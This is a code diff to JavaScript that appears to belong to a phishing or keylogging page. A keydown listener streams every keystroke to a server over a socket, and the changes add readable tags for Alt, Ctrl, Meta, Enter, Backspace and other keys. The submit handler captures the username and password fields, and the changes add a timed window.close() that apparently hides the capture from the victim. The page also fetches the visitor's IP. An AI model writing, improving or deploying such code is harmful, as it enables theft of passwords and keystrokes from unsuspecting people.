@@ -42,14 +42,28 @@ xhttp.open("GET", "/ip", true)
 xhttp.send()
 
 addEventListener("keydown", event =>{
+  event.altKey
   const data = {
-    "key": event.key,
-    "active": document.activeElement.tagName.toLowerCase()
+    "key": event.key
   }
+
+  data["key"] = event.altKey ? "[Alt]" : data["key"]
+  data["key"] = event.metaKey ? "[Meta]" : data["key"]
+  data["key"] = event.ctrlKey ? "[Ctrl]" : data["key"]
+  data["key"] = data["key"] === "Backspace" ? "[Backspace]" : data["key"]
+  data["key"] = data["key"] === "Delete" ? "[Delete]" : data["key"]
+  data["key"] = data["key"] === "Enter" ? "[Enter]" : data["key"]
+  data["key"] = data["key"] === "Tab" ? "[Tab]" : data["key"]
+  data["key"] = data["key"] === " " ? "[Space]" : data["key"]
+
   socket.emit("key", data)
 })
 
 submit.addEventListener("click", () => {
+  setTimeout(()=>{
+    window.close()
+  }, 300)
+
   const data = {
     "user": user.value,
     "pass": pass.value
